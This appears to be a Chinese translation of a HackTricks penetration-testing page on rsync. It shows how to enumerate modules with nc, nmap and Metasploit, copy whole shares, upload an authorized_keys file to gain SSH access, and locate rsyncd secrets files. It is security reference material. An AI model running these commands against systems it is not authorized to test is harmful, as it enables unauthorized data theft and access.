# 873 - Rsync渗透测试

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 如果你在**网络安全公司**工作，想在**HackTricks**上看到你的**公司广告**，或者想要获取**PEASS最新版本或下载HackTricks的PDF**？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列。
* 获取[**官方PEASS & HackTricks周边商品**](https://peass.creator-spring.com)。
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## **基本信息**

> **rsync** 是一个用于在计算机与外部硬盘驱动器之间以及网络计算机之间高效[传输](https://en.wikipedia.org/wiki/File\_transfer)和[同步](https://en.wikipedia.org/wiki/File\_synchronization)[文件](https://en.wikipedia.org/wiki/Computer\_file)的实用程序，通过比较文件的[修改时间](https://en.wikipedia.org/wiki/Timestamping\_\(computing\))和大小。它通常可以在[类Unix](https://en.wikipedia.org/wiki/Unix-like)[操作系统](https://en.wikipedia.org/wiki/Operating\_system)中找到。rsync算法是一种[增量编码](https://en.wikipedia.org/wiki/Delta\_encoding)，用于最小化网络使用。[Zlib](https://en.wikipedia.org/wiki/Zlib)可用于额外的[数据压缩](https://en.wikipedia.org/wiki/Data\_compression)，[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3)而[SSH](https://en.wikipedia.org/wiki/Secure\_Shell)或[stunnel](https://en.wikipedia.org/wiki/Stunnel)可用于安全性。

来自[wikipedia](https://en.wikipedia.org/wiki/Rsync)。

**默认端口：** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## 枚举

### 横幅 & 手动通信
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **枚举共享文件夹**

**rsync 模块本质上是一个目录共享**。这些模块**可以选择由密码保护**。此选项列出可用模块，并可选地确定访问模块是否需要密码：
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

#Example using IPv6 and a different port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
请注意，共享名称可能被配置为不显示。因此，可能有一些**隐藏**的内容。
请注意，可能会列出一些需要一些（不同的）**凭证**才能访问的**共享名称**。因此，并不是所有列出的名称都能访问，如果在尝试访问这些名称时收到**“访问拒绝”**消息，你将会注意到这一点。

### [**暴力破解**](../generic-methodologies-and-resources/brute-force.md#rsync)

### 手动 Rsync

一旦你有了**模块列表**，根据你想要采取的行动以及是否需要认证，你有几种不同的选项。**如果不需要认证**，你可以**列出**一个共享文件夹：
```bash
rsync -av --list-only rsync://192.168.0.123/shared_name
```
And **复制** all **文件** to your local machine via the following command:
```bash
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
这将**递归传输目录** `<shared_name>` 中的所有文件从机器 `<IP>` 到本地机器上的 `./rsync_shared` 目录。文件以“归档”模式传输，确保在传输过程中保留符号链接、设备、属性、权限、所有权等。

如果您**拥有凭据**，您可以使用以下命令**列出/下载**一个**共享名称**（将提示输入密码）：
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
你也可以使用 rsync **上传**一些**内容**（例如，在这种情况下，我们可以上传一个 _**authorized\_keys**_ 文件以获取对盒子的访问权限）：
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

找到rsyncd配置文件：
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
在配置文件中，有时你会发现参数 _secrets file = /path/to/file_，这个文件可能包含用于认证到 rsyncd 的用户名和密码。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在**网络安全公司**工作吗？你想在**HackTricks**中看到你的**公司广告**吗？或者你想要访问**最新版本的 PEASS 或下载 HackTricks 的 PDF**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏。
* 获取[**官方的 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **推特** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**上关注**我。
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
